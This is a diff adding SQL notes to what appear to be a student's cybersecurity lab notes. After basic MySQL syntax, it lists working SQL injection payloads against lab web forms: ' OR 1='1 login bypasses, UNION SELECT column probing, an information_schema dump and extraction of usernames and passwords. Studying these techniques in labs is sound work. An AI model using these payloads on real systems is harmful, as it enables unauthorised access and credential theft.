@@ -128,6 +128,60 @@ ssh <username>@<ip>
 http://10.50.34.125/ = /var/www/html		# this is NOT where we put .ssh
 
 
+###### SQL Injection
+
+mysql		# start SQL, can use ' --user=<usr> --pass=<pword> ' to specify a user
+# SQL is organized: Database -{ Table -{ Column
+
+show databases;		# shows databases that exist on system
+# Defaul Databases:
+	information_schema = Database of databases, meta data
+	mysql = Config, user info
+	performance_schema = status info
+
+show tables from <database>;		# shows tables from selected database
+
+select <column> from <database>.<table>;		# shows selected column from specified list, use * to grab all columns
+
+# use 'UNION' between commands to join them together, output must be similar
+#	tb1 has two less colums than tb2 in this example:
+select *,null,null from db1.tb1 UNION select * from db1.tb2;		# adds 2 temp colums to tb1
+
+describe <database>.<table>;		# shows columns field types
+
+SELECT <column> FROM <db>.<tbl> WHERE <condition>		# use 'WHERE' to add a condition:	
+	=, !=, < <=, >, >=		Standard numerical operators													col_name != 4
+	BETWEEN … AND …				Number is within range of two values (inclusive)			col_name BETWEEN 1.5 AND 10.5
+	NOT BETWEEN … AND …		Number is not within range of two values (inclusive)	col_name NOT BETWEEN 1 AND 10
+	IN (…)								Number exists in a list																col_name IN (2, 4, 6)
+	NOT IN (…)						Number does not exist in a list												col_name NOT IN (1, 3, 5)
+https://sqlbolt.com/lesson/select_queries_with_constraints		# more info here
+
+## unsanitized POST fields
+enter password: dan' OR 1='1		# passes a TRUE bool through the password check system
+	<value>' or 1='1				# stantard TRUE bool
+	<value>' or 1='1;				# TRUE with end line char
+	<value>' or 1='1; #			# TRUE with end line and comment out
+	<value>' or 1='1; --		# same as above
+
+# when working with a web SQL table find # of rows & columns and start with the lowest
+	Rows:5
+	Columns:4
+# try all of these and if they do not work add another number (i.e. select 1,2,3,4,5) to determine the # of columns
+Audi' UNION select 1,2,3,4		# in this case Audi is a vaule that works with unsanitized POST field stuff above
+Audi' UNION select 1,2,3,4;
+Audi' UNION select 1,2,3,4; #
+Audi' UNION select 1,2,3,4; --
+Audi' UNION select 1,2,3,4,5; #		# command that works, in this example there are 5 columns and column 2 is hidden
+# Golden Statement: select table_schema,table_name,column_name from information_schema.columns
+Audi' Union select table_schema,2,table_name,column_name,5 from information_schema.columns; #
+# 2 is inserted bc its hidden & 5 is tacked on to mach the requied num of fields
+select id,2,name,pass,5 from session.user
+
+
+## unsanitized GET fields
+# must have .php, look under "network" > "Request" for username & pword variable names
+http://10.50.21.144/login.php?usrNameVar=dan' or 1='1&pwordVar=dan' or 1='1		# get request using TRUE bool
 
 
 
@@ -146,5 +200,3 @@ http://10.50.34.125/ = /var/www/html		# this is NOT where we put .ssh
 
 
 
-
-generate keys
